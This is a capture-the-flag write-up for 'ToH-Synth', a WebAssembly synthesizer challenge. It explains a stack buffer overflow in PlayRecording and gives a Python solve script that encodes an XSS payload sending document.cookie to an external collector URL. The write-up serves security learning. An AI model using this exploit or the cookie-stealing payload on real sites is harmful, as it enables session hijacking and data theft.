# ToH-Synth

> It's not just about knowing keys... you also need to have an ear for choosing the right sound for the synthesizer to play!

## Overview

The challenge consists of a web-based synthesizer built with WebAssembly that reproduces audio directly in the browser. 

## The Synthesizer
The WebAssembly-based synthesizer, taken from the [wasm-synth](https://github.com/TimDaub/wasm-synth/) GitHub repository, provides a browser interface for sound generation with the following features:

### Oscillator Controls
- Four independent oscillators (indexed 0-3)
- Multiple waveform options (sine, square, saw, triangle with various harmonics)
- Volume level adjustment per oscillator
- Enable/disable toggle for each oscillator

### ADSR Envelope System
The envelope controls how a sound's volume evolves over time:
- Attack time (`xa`): How quickly a note reaches maximum volume
- Decay time (`xd`): Transition from maximum to sustain level
- Sustain level (`ys`): Volume maintained while a key is held (0.0-1.0)
- Release time (`xr`): Fade-out time after key release
- Attack level (`ya`): Custom parameter for maximum attack level

Graphically represented:
```
Level |
  |     /\
  |    /  \
  |   /    \______ 
  |  /            \
  | /              \
  |/                \
  +-------------------> Time
    |  |  |        |
    xa xd ys       xr
```

Different envelope settings create different instrument sounds:
- Fast attack (low `xa`) and quick release (low `xr`): Piano or percussion
- Slow attack (high `xa`) and long release (high `xr`): Pad or string sounds

### MIDI Note Interface
- Note-on events when keys are pressed (with MIDI key values)
- Note-off events when keys are released
- Support for three octaves (values 60-95)

| Note | Octave 1 | Octave 2 | Octave 3 |
|------|----------|----------|----------|
| C    | 60       | 72       | 84       |
| C#   | 61       | 73       | 85       |
| D    | 62       | 74       | 86       |
| D#   | 63       | 75       | 87       |
| E    | 64       | 76       | 88       |
| F    | 65       | 77       | 89       |
| F#   | 66       | 78       | 90       |
| G    | 67       | 79       | 91       |
| G#   | 68       | 80       | 92       |
| A    | 69       | 81       | 93       |
| A#   | 70       | 82       | 94       |
| B    | 71       | 83       | 95       |

### Communication Protocol
The synthesizer sends all user interactions to the C-based logging server as events with specific parameters:

| Event | Parameters | Description |
|-------|------------|-------------|
| `NoteOn` | `key` (integer): MIDI note number (60-95) | Activates a note when a key is pressed, triggering sound generation |
| `NoteOff` | `key` (integer): MIDI note number (60-95) | Deactivates a note when a key is released, initiating the release phase |
| `Envelope` | `index` (integer): Oscillator index (0-3)<br>`xa` (float): Attack time (from 1 onwards)<br>`xd` (float): Decay time<br>`ys` (float): Sustain level<br>`xr` (float): Release time<br>`ya` (float): Attack level | Updates envelope parameters for a specific oscillator |
| `Level` | `index` (integer): Oscillator index (0-3)<br>`value` (float): Volume level | Updates the volume level for a specific oscillator |
| `WaveForm` | `index` (integer): Oscillator index (0-3)<br>`value` (integer): Waveform type (0-17) | Changes the waveform type for a specific oscillator |
| `Enable` | `index` (integer): Oscillator index (0-3)<br>`value` (boolean): Enable state | Activates or deactivates a specific oscillator |
| `StartRecording` | None | Initiates recording of played notes |
| `StopRecording` | None | Stops the current recording session |
| `PlayRecording` | None | Plays back the recorded sequence of notes |
| `SetSynthData` | `data` (array): Array of objects with `key` and `offset` properties | Loads synthesizer data from an external source |

### Waveform Types
- 0: SINE 
- 1: SQUARE_DIGITAL
- 2-8: SQUARE with varying harmonics (3, 4, 6, 8, 16, 32, 64)
- 9: SAW_DIGITAL
- 10-16: SAW with varying harmonics (3, 4, 6, 8, 16, 32, 64)
- 17: TRIANGLE

These parameters provide potential avenues for exploitation through careful manipulation.

## Challenge Solution

The goal is to exploit a buffer overflow vulnerability located in the WebAssembly code to overwrite bytes of a variable that will be rendered in an HTML `div`.

### General Approach

To discover the vulnerability, we need to inspect the entire codebase. Following the hint related to the recording features, the user can observe that additional debugging is enabled in the browser console. By inspecting the console, the user is able to trace the messages sent to understand how the React web app integrates with the WebAssembly modules.

By analyzing the WebAssembly source code you can find within `src/cpp` folder, with a focus on the added features, it's possible to identify a buffer overflow vulnerability in the `PlayRecording` function that allows overwriting the message variable. 

```cpp
std::string VoiceManager::PlayRecording() {
  char lyrics[111] = "****ski-Bi dibby dib yo da dub dub yo dab dub dub ski-Bi dibby dib yo da dub dub yo dab dub dub*****";
  char loading[27] = "...playing TohSynth song..";
  char songBytes[MAX_RECORDED_KEYS];
  std::string eventLog = "|";
  if (this->keys.size() == 0 || this->isRecording || this->keys.size() != this->recordedKeys || this->offset > 28 || this->offset < -27) return "";
  for (int i = 0; i < this->recordedKeys; i++){
    songBytes[i] = this->keys[i].keyValue - this->keys[i].offset;
    eventLog += "(" + std::to_string(this->keys[i].keyValue) + "," + std::to_string(this->keys[i].offset) + "),";
  }
  strncpy(loading, songBytes, this->recordedKeys); // <-- if songBytes is larger than 27 bytes, you can overflow the loading variable and overwrite the lyrics buffer
  if (!eventLog.empty() && eventLog.back() == ',') {
    eventLog.pop_back();
  }
  return std::string(lyrics + eventLog);
}
```

One can reason about this vulnerability by also inspecting the `script.sh` file, where there are flags that disable specific checks on the stack (no optimization, `STACK_OVERFLOW_CHECK=0`, `SAFE_HEAP=0`).

This variable is displayed within the `playStatus` `div` element using the `innerHTML` property, which makes it possible for an XSS attack to occur.

From the browser console, we can see that keyboard values are limited to the range 60-95, which doesn't cover all the ASCII printable characters needed for a complete exploit. However, by examining how the `offset` attribute is computed, it becomes clear that modifying the `xa` and `xd` attributes of the envelope allows changing the `offset` value in both positive and negative directions, providing access to a wider range of characters.

```cpp
void VoiceManager::UpdateEnvelope(int i, float xa, float xd, float ys, float xr, float ya) {
  envelopes[i] = { xa, xd, ys, xr, ya };
  int xaInt = static_cast<uint8_t>(xa);
  int xdInt = static_cast<uint8_t>(xd);
  int o = xaInt - xdInt;
  if (o < -27 || o > 28) {
    EM_ASM({
      console.error(`Invalid offset value: ${$0}. It should be between -27 and 28.`);
    }, o);
    return;
  } else {
    this->offset = o;
  }
  SetEnvelope(i);
}
```

### Exploitation

The attack method involves:

1. Recording a sequence of notes with an initial shift in order to write the XSS payload in the `lyrics` variable, as shown in the script below
2. Exporting the composition as a `.synth` file. This can be done by clicking on the `Play` button
3. Uploading the file to the bot, which performs a GET request with parameters that call the `SetSynthData` method to populate the `keys` data structure
4. When the bot clicks `Play`, the exploit is executed, running the injected code

```python
import requests
import base64

botURL = "http://localhost:3000"
tohSynthURL = "http://localhost:3000"

pipedreamURL = "<YOUR_PIPEDREAM_URL>"
xssPayload = 'A' * 32 + '<img src="x.png" onerror="fetch(\'' + pipedreamURL + '/\'+document.cookie);"/>'

print(f"Payload: {xssPayload}\n")
print(f"Payload Length:{len(xssPayload)}\n")

synthData = ""
for x in xssPayload:
    char_ascii = ord(x)
    found = False
    
    offset = -27
    while offset >= -27 and offset <= 28:
        charCode = char_ascii + offset
        if 60 <= charCode <= 95:
            synthData += f"({charCode},{offset}),"
            found = True
            break
        offset += 1
    
    if not found:
        print(f"Cannot encode '{x}' (ASCII {char_ascii})")
        exit(1)
        
synthData = synthData.rstrip(",")
print(f"SynthData: {synthData}\n")
encoded_synthData = base64.b64encode(synthData.encode()).decode()
print(f"Base64-encoded SynthData: {encoded_synthData}\n")

r = requests.post(f"{botURL}/play", data={
    "url": f"{tohSynthURL}/?synthdata={encoded_synthData}"
})
```